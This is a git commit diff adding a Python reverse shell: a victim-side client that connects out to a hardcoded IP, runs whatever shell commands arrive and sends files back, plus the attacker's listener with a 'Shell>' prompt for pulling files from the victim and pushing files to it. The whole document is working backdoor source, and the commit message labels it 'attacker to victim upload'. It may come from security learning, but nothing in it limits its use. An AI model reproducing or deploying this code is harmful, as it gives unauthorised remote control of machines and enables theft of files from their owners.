2fdd82633e2b9c4bbee357974d1645983373d076
Harshil Shah <harshil.r1999@gmail.com>
2020-01-14 10:38:25 +0530

    [ADDED] attacker to victim upload

---
+++ client_mod.py
@@ -0,0 +1,68 @@
+import socket
+import subprocess
+import os
+ 
+def transfer(s, path):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while len(packet) > 0:
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE'.encode())
+    else:
+        s.send('File not found'.encode())
+ 
+def download(s, command):
+    instruction, path = command.split('*')
+    # going to put target file in working directory
+    # so discard  original path from server
+    path = path.split('/')[-1]
+    f = open(path, 'wb')
+    while True:
+        bits = s.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4])
+            f.close()
+            break
+        f.write(bits)
+        
+def connect():
+    s = socket.socket()
+    s.connect(("192.168.2.133", 8080))
+ 
+    while True:
+        command = s.recv(1024).decode()
+ 
+        if 'terminate' in command:
+            s.close()
+            break
+        
+        elif 'grab' in command:
+            grab, path = command.split('*')
+            try:
+                transfer(s, path)
+            except:
+                pass
+ 
+        elif 'download' in command:
+            try:
+                download(s, command)
+                s.send('[+] Transfer Complete'.encode())
+            except:
+                s.send('[-] There was a problem with the transfer'.encode())
+        else:
+            CMD = subprocess.Popen(command,
+                    shell=True, stdout= subprocess.PIPE,
+                    stderr= subprocess.PIPE, stdin=subprocess.PIPE)
+            result = b''.join(CMD.communicate())
+            
+            if len(result.decode()) == 0:
+                result = 'Success'.encode()
+            
+            s.send(result)
+ 
+def main():
+    connect()
+ 
+main()
---
+++ server_mod.py
@@ -0,0 +1,70 @@
+import os
+import socket
+
+def transfer(conn, command):
+    conn.send(command.encode())
+    grab, path = command.split("*")
+
+    if(grab == 'download'):
+        download, path = command.decode().split("*")
+        try:
+            transfer(conn, path)
+        except:
+            pass
+    else:    
+        f = open('/root/Desktop/'+path, 'wb')
+        while True:
+            bits = conn.recv(1024)
+            if bits.endswith('DONE'.encode()):
+                f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
+                f.close()
+                print ('[+] Transfer completed ')
+                break
+            if 'File not found'.encode() in bits:
+                print ('[-] Unable to find out the file')
+                break
+            f.write(bits)
+
+
+def upload(conn, command):
+    conn.send(command.encode())
+    instruction, path = command.split('*')
+    
+    if os.path.exists(path):
+        with open(path, 'rb') as f:
+            packet = f.read(1024)
+            while len(packet) > 0:
+                conn.send(packet)
+                packet = f.read(1024)
+            conn.send('DONE'.encode())
+    else:
+        print('[-] File does not exist')
+
+        
+def connecting():
+    s = socket.socket()
+    s.bind(("192.168.0.152", 8080))
+    s.listen(1)
+    print('[+] Listening for income TCP connection on port 8080')
+    conn, addr = s.accept()
+    print('[+]We got a connection from', addr)
+
+    while True:
+        command = input("Shell> ")
+        if 'terminate' in command:
+            conn.send('terminate'.encode())
+            conn.close()
+            break
+        elif 'grab' in command:
+            transfer(conn, command)
+
+        elif 'download*' in command:
+            upload(conn, command)
+            print(conn.recv(1024).decode())
+        else:
+            conn.send(command.encode())
+            print(conn.recv(1024).decode())
+def main():
+    connecting()
+main()
+
